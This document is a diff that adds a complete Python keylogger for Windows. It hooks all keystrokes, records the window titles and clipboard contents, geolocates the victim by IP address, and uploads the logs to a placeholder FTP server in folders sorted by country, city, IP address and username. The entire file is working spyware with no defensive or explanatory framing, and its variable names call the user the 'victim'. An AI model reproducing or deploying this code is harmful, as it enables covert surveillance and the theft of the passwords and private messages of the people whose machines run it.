@@ -1,0 +1,164 @@
+#!/usr/bin/env python
+
+from ftplib import FTP
+import time
+import os
+import requests
+import json
+import urllib2
+import pythoncom
+import pyHook
+import pyperclip
+
+lastWindow = None
+r = requests.get(r'http://jsonip.com')
+ip = r.json()['ip']
+req = urllib2.Request("https://geoiptool.com/api/view/?ip=" + ip)
+response = urllib2.urlopen(req)
+the_page = response.read()
+p = json.loads(the_page)
+country = p["country_name"]
+region = p["region_name"]
+city = p["city"]
+victim = os.getenv('USERNAME')
+f_name = "secrets.dat"
+nf = open(f_name, 'w')
+nf.close()
+
+
+def log_upload(x):
+    global f_name
+    t = time.localtime()
+    timestamp = time.strftime('%b-%d-%Y_%H-%M-%S', t)
+    filename = ("log-" + timestamp + ".dat")
+    ftp = FTP("FTP_HOST")
+    ftp.login("FTP_USERNAME", "FTP_PASSWORD")
+    if country in ftp.nlst():
+        ftp.cwd(country)
+        if region in ftp.nlst():
+            ftp.cwd(region)
+            if city in ftp.nlst():
+                ftp.cwd(city)
+                if ip in ftp.nlst():
+                    ftp.cwd(ip)
+                    if victim in ftp.nlst():
+                        ftp.cwd(victim)
+                        ftp.storbinary('STOR ' + filename, open(x, 'rb'))
+                        ftp.quit()
+                    else:
+                        ftp.mkd(victim)
+                        ftp.cwd(victim)
+                        ftp.storbinary('STOR ' + filename, open(x, 'rb'))
+                        ftp.quit()
+                else:
+                    ftp.mkd(ip)
+                    ftp.cwd(ip)
+                    ftp.mkd(victim)
+                    ftp.cwd(victim)
+                    ftp.storbinary('STOR ' + filename, open(x, 'rb'))
+                    ftp.quit()
+            else:
+                ftp.mkd(city)
+                ftp.cwd(city)
+                ftp.mkd(ip)
+                ftp.cwd(ip)
+                ftp.mkd(victim)
+                ftp.cwd(victim)
+                ftp.storbinary('STOR ' + filename, open(x, 'rb'))
+                ftp.quit()
+        else:
+            ftp.mkd(region)
+            ftp.cwd(region)
+            ftp.mkd(city)
+            ftp.cwd(city)
+            ftp.mkd(ip)
+            ftp.cwd(ip)
+            ftp.mkd(victim)
+            ftp.cwd(victim)
+            ftp.storbinary('STOR ' + filename, open(x, 'rb'))
+            ftp.quit()
+    else:
+        ftp.mkd(country)
+        ftp.cwd(country)
+        ftp.mkd(region)
+        ftp.cwd(region)
+        ftp.mkd(city)
+        ftp.cwd(city)
+        ftp.mkd(ip)
+        ftp.cwd(ip)
+        ftp.mkd(victim)
+        ftp.cwd(victim)
+        ftp.storbinary('STOR ' + filename, open(x, 'rb'))
+        ftp.quit()
+    fo = open(f_name, 'w')
+    fo.flush()
+    fo.close()
+
+
+def keypressed(event):
+    global lastWindow
+    global f_name
+    window = event.WindowName
+    if event.Ascii == 13:
+        tm = time.strftime("[%H:%M:%S]  ")
+        keys = '\n'
+        fp = open(f_name, 'a')
+        data = keys
+        fp.write(data)
+        fp.write(tm)
+        fp.close()
+    elif event.Ascii == 8:
+        keys = '<BS>'
+        fp = open(f_name, 'a')
+        data = keys
+        fp.write(data)
+        fp.close()
+    elif event.Ascii == 9:
+        keys = '\t'
+        fp = open(f_name, 'a')
+        data = keys
+        fp.write(data)
+        fp.close()
+    elif event.Ascii == 27:
+        keys = '<ESC>'
+        fp = open(f_name, 'a')
+        data = keys
+        fp.write(data + "\n")
+        fp.close()
+    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
+        pass
+    elif event.Ascii == 22:
+        keys = pyperclip.paste()
+        fp = open(f_name, 'a')
+        data = keys
+        fp.write("###########START  CLIPBOARD#############\n")
+        fp.write(data + "\n")
+        fp.write("###########STOP  CLIPBOARD#############\n")
+        fp.close()
+    else:
+        keys = unichr(event.Ascii)
+        if window != lastWindow:
+            tm = time.strftime("[%H:%M:%S]  ")
+            fp = open(f_name, 'a')
+            fp.write("\n"*2)
+            fp.write(tm)
+            fp.write("############### " + window + " #################" + "\n")
+            fp.close()
+            lastWindow = window
+        fp = open(f_name, 'a')
+        data = keys
+        fp.write(data)
+        fp.close()
+    if os.path.getsize("secrets.dat") > 100000:
+        try:
+            log_upload(f_name)
+        except:
+            pass
+    else:
+        pass
+
+
+obj = pyHook.HookManager()
+obj.KeyDown = keypressed
+obj.HookKeyboard()
+pythoncom.PumpMessages()
